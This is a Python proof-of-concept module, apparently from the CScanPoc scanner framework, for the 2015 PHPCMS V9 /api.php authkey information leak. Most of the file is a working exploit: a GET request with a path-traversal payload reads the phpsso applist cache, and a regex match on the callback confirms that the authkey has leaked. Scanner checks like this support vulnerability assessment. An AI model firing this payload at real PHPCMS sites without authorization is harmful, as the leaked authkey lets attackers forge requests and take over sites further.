# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    vuln_id = 'PHPCMS_0002'  # 平台漏洞编号，留空
    name = 'PHPCMS V9 /api.php Authkey 信息泄漏'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2015-07-17'  # 漏洞公布时间
    desc = '''
        PHPCMS V9 /api.php Authkey 信息泄漏。
    '''  # 漏洞描述
    ref = 'http://www.cnblogs.com/LittleHann/p/4624198.html'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'PHPCMS'  # 漏洞应用名称
    product_version = 'PHPCMS_V9'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '403e290f-7710-49f4-b249-f1325bf17ef8'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-04'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = ('/api.php?op=get_menu&act=ajax_getlist&callback=aaaaa&parentid=0&'
                       'key=authkey&cachefile=..\..\..\phpsso_server\caches\caches_admin'
                       '\caches_data\\applist&path=admin')
            verify_url = self.target + payload
            req = requests.get(verify_url)
            pathinfo = re.compile(r'aaaaa\(\[",(.*),,,"\]\)')
            match = pathinfo.findall(req.content)
            if match:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
